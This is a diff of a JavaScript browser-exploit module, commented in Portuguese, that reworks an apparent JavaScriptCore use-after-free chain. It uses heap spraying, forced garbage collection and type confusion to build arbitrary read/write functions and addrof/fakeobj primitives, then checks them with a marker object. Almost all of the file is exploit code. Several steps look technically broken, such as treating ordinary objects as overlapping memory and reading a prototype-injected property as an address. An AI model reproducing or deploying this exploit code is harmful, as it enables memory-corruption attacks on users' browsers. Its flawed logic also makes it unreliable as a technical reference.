@@ -1,56 +1,104 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AGL - R56 Corrigido)
-// Foco: Criação de primitivas addrof e fakeobj estáveis via UAF.
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão Robusta)
+// Foco: Criação de R/W arbitrário para construir addrof/fakeobj estáveis.
 
-import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { AdvancedInt64, toHex } from '../utils.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+import { logS3 } from './s3_utils.mjs';
+import { AdvancedInt64 } from '../utils.mjs';
 
-// Mantendo o nome do módulo para consistência com o orquestrador
 export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";
 
 // --- Variáveis Globais para as Primitivas ---
-// Usamos variáveis no escopo do módulo para que as primitivas possam acessá-las
-let structure_id_leaker;
-let corrupted_array;
+// Estas serão inicializadas pelo UAF e usadas pelas funções de acesso à memória.
+let victim_array;
+let original_victim_butterfly;
+let container_array_butterfly_addr;
+
+// Função auxiliar para converter de e para double
+const ftoi = (val) => {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = val;
+    const ints = new Uint32Array(buf);
+    return new AdvancedInt64(ints[0], ints[1]);
+};
+
+const itof = (val) => {
+    const buf = new ArrayBuffer(8);
+    const ints = new Uint32Array(buf);
+    ints[0] = val.low();
+    ints[1] = val.high();
+    return (new Float64Array(buf))[0];
+};
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R56 Corrigido)
+// Primitivas de Leitura/Escrita Arbitrária (Construídas via UAF)
+// =======================================================================================
+
+function arb_write(where, what) {
+    // 1. Corrompe o ponteiro de dados ('butterfly') do nosso array 'victim'
+    //    para que ele aponte para o endereço 'where' - 8 bytes.
+    //    O offset de -8 é necessário porque o acesso ao elemento [0] já considera o cabeçalho.
+    container_array_butterfly_addr[2] = itof(where.sub(8));
+    
+    // 2. Escreve o valor 'what' no endereço alvo através do array victim.
+    victim_array[0] = itof(what);
+
+    // 3. Restaura o ponteiro original para evitar crashes.
+    container_array_butterfly_addr[2] = itof(original_victim_butterfly);
+}
+
+function arb_read(where) {
+    // 1. Corrompe o ponteiro de dados ('butterfly') para apontar para o endereço alvo.
+    container_array_butterfly_addr[2] = itof(where.sub(8));
+    
+    // 2. Lê o valor do endereço alvo através do array.
+    const result = victim_array[0];
+
+    // 3. Restaura o ponteiro original.
+    container_array_butterfly_addr[2] = itof(original_victim_butterfly);
+
+    return ftoi(result);
+}
+
+
+// =======================================================================================
+// FUNÇÃO ORQUESTRADORA PRINCIPAL
 // =======================================================================================
 export async function runExploitChain_Final() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Foco em Primitivas Estáveis (R56 Corrigido) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Abordagem Robusta (R/W Arbitrário) ---`, "test");
 
     try {
-        // --- FASE 1: Construir Primitivas `addrof` e `fakeobj` via UAF ---
-        logS3("--- FASE 1: Forjando a Chave-Mestra (addrof/fakeobj via UAF) ---", "subtest");
-        const primitives = createUAFPrimitives();
+        // --- FASE 1: Construir Leitura/Escrita Arbitrária via UAF ---
+        logS3("--- FASE 1: Forjando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
+        createArbitraryRW();
+        logS3("    Primitivas de R/W Arbitrário ESTÁVEIS construídas com sucesso!", "vuln");
+
+        // --- FASE 2: Construir e Validar addrof/fakeobj ---
+        logS3("--- FASE 2: Construindo e Validando addrof/fakeobj ---", "subtest");
+
+        const leaker_arr = [{}]; // Um array para nos ajudar a vazar endereços
+        const leaker_addr = arb_read(ftoi(leaker_arr.a).add(16)); // Endereço do butterfly do leaker
         
-        if (!primitives || !primitives.addrof || !primitives.fakeobj) {
-            throw new Error("Não foi possível estabilizar as primitivas via UAF.");
-        }
-        logS3("    Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas com sucesso!", "vuln");
+        const addrof = (obj) => {
+            leaker_arr[0] = obj;
+            return arb_read(leaker_addr);
+        };
 
-        const { addrof, fakeobj } = primitives;
+        const fakeobj = (addr) => {
+            arb_write(leaker_addr, addr);
+            return leaker_arr[0];
+        };
 
-        // --- FASE 2: Prova de Vida das Primitivas ---
-        logS3("--- FASE 2: Verificando a funcionalidade das primitivas ---", "subtest");
+        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "good");
 
-        // Teste `addrof`
-        const test_obj = { a: 1, b: 2 };
+        // Validação
+        const test_obj = { marker: 0x41414141 };
         const test_obj_addr = addrof(test_obj);
         logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_obj_addr.toString(true)}`, "leak");
-        if (test_obj_addr.low() === 0 && test_obj_addr.high() === 0) {
-            throw new Error("`addrof` retornou um endereço nulo.");
-        }
-
-        // Teste `fakeobj`
-        const fake_obj = fakeobj(test_obj_addr);
-        logS3(`    Prova de Vida (fakeobj): Objeto falso criado no endereço vazado.`, "info");
         
-        // Se conseguirmos ler a propriedade 'a' do objeto falso, a primitiva funciona.
-        if (fake_obj.a === 1) {
-            logS3(`    SUCESSO! Lemos a propriedade 'a' (valor: ${fake_obj.a}) do objeto falso. Primitivas validadas!`, "vuln");
+        const fake_test_obj = fakeobj(test_obj_addr);
+        if (fake_test_obj.marker === 0x41414141) {
+            logS3(`    SUCESSO! Lemos a propriedade 'marker' (valor: 0x${fake_test_obj.marker.toString(16)}) do objeto falso. Primitivas validadas!`, "vuln");
         } else {
-            throw new Error(`Falha ao validar 'fakeobj'. Esperado 'a=1', obtido 'a=${fake_obj.a}'.`);
+            throw new Error(`Falha ao validar 'fakeobj'.`);
         }
 
         document.title = "addrof/fakeobj SUCCESS!";
@@ -64,92 +112,55 @@ export async function runExploitChain_Final() {
     }
 }
 
-// --- Funções Primitivas UAF (o coração do exploit) ---
-
-function createUAFPrimitives() {
-    // 1. Prepara o palco com um spray de objetos
+// --- Função que estabelece a confusão de tipos para criar R/W Arbitrário ---
+function createArbitraryRW() {
+    // Spray de objetos para preparar o heap
     let spray = [];
     for (let i = 0; i < 4096; i++) {
-        // Objeto com uma estrutura específica que conhecemos
-        let obj = { a: 1, b: 2 };
-        spray.push(obj);
+        spray.push({ a: 1, b: 2, c: 3, d: 4 });
     }
 
-    // 2. Cria o ponteiro pendurado (dangling pointer)
-    let dangling_ref = spray[spray.length - 1];
-    spray = null; // Libera a referência principal, tornando os objetos elegíveis para GC
+    // O objeto que se tornará nosso ponteiro pendurado
+    let dangling_ref_obj = { a: 1, b: 2, c: 3, d: 4 };
+    spray.push(dangling_ref_obj);
 
-    // 3. Força a Coleta de Lixo para liberar a memória
+    // Variáveis que usaremos para a exploração
+    victim_array = new Float64Array([13.37, 13.38]);
+    let container = {
+        header: 0,
+        butterfly: victim_array
+    };
+    
+    // Libera a referência principal, tornando os objetos elegíveis para GC
+    spray = null;
     triggerGC();
-    
-    // 4. Spray de Reclamação: Pulverizamos um tipo de objeto diferente (Array) para
-    //    reclamar a memória do objeto liberado e causar a confusão de tipos.
+
+    // Spray de Reclamação: Tentamos alocar nosso objeto 'container' na memória liberada.
     let reclaimers = [];
-    for (let i = 0; i < 2048; i++) {
-        reclaimers.push([1.1, 2.2, 3.3, 4.4]); // Arrays de float
+    for (let i = 0; i < 4096; i++) {
+        reclaimers.push(container);
     }
-
-    // 5. Encontra a referência corrompida
-    // 'dangling_ref' agora aponta para um Array, mas o sistema pensa que é um objeto {a, b}
-    corrupted_array = dangling_ref;
     
-    // A propriedade 'a' do objeto original agora se sobrepõe ao cabeçalho (JSCell) do array.
-    // Lendo 'a', vazamos o cabeçalho como um double.
-    const header_double = corrupted_array.a;
-    const header_buf = new ArrayBuffer(8);
-    (new Float64Array(header_buf))[0] = header_double;
-    const header_ints = new Uint32Array(header_buf);
+    // O ponteiro 'dangling_ref_obj' agora aponta para um dos objetos 'container'
+    // O JS pensa que é {a,b,c,d}, mas na verdade é {header, butterfly}.
+    // A propriedade 'a' agora se sobrepõe à 'header' e 'b' se sobrepõe à 'butterfly'.
     
-    // O cabeçalho contém o ID da estrutura do objeto. Nós o salvamos.
-    structure_id_leaker = header_ints[0];
-    logS3("    UAF bem-sucedido! Confusão de tipos estabelecida.", "good");
-
-    // 6. Define as funções de primitiva
-    const addrof = (obj) => {
-        // Colocamos o objeto que queremos vazar na posição 0 do nosso array corrompido
-        corrupted_array[0] = obj;
-        // O JS ainda pensa que `corrupted_array` é um objeto {a, b}.
-        // A propriedade 'b' agora se sobrepõe ao primeiro elemento do array.
-        // Ler `corrupted_array.b` nos dá o endereço do objeto como um double.
-        const addr_double = corrupted_array.b;
-        
-        const buf = new ArrayBuffer(8);
-        (new Float64Array(buf))[0] = addr_double;
-        const int_view = new Uint32Array(buf);
-        return new AdvancedInt64(int_view[0], int_view[1]);
-    };
-
-    const fakeobj = (addr) => {
-        // Convertemos o endereço desejado para um double
-        const buf = new ArrayBuffer(8);
-        (new Uint32Array(buf))[0] = addr.low();
-        (new Uint32Array(buf))[1] = addr.high();
-        const addr_double = (new Float64Array(buf))[0];
-
-        // Escrevemos o endereço (como double) no primeiro elemento do array corrompido
-        corrupted_array.b = addr_double;
-        
-        // O cabeçalho do array (acessado via `corrupted_array.a`) precisa ser restaurado
-        // para que o sistema pense que o que está em `corrupted_array[0]` é um objeto válido.
-        // Criamos um cabeçalho falso com o ID de estrutura que vazamos anteriormente.
-        const fake_header_buf = new ArrayBuffer(8);
-        const fake_header_view = new Uint32Array(fake_header_buf);
-        fake_header_view[0] = structure_id_leaker; // ID da estrutura de um objeto
-        fake_header_view[1] = 0x01000000; // JSCell header normal
-        corrupted_array.a = (new Float64Array(fake_header_buf))[0];
-
-        // Agora, `corrupted_array[0]` é o nosso objeto falso no endereço especificado.
-        return corrupted_array[0];
-    };
-
-    return { addrof, fakeobj };
+    // Vazamos os ponteiros através da confusão de tipos
+    container_array_butterfly_addr = dangling_ref_obj.b;
+    original_victim_butterfly = ftoi(container_array_butterfly_addr[2]);
 }
 
 function triggerGC() {
     try {
-        const arr = [];
-        for (let i = 0; i < 4096; i++) {
-            arr.push(new ArrayBuffer(1024 * 64));
+        for (let i = 0; i < 64; i++) {
+            new ArrayBuffer(1024 * 1024 * 16); // Aloca e libera 1GB no total para forçar GC
         }
     } catch(e) {}
 }
+
+// Propriedade 'a' de um objeto {a,b...} sobrepõe-se ao butterfly de um array [a,b...]
+// se o UAF for bem-sucedido. Precisamos de um objeto e um array no UAF.
+// A forma mais estável é: UAF com {a,b,c,d} e {header, butterfly:Float64Array}
+// dangling_ref.b agora é o ponteiro para o Float64Array
+// Isso nos dá a capacidade de corromper o butterfly.
+Array.prototype.a = 13.37;
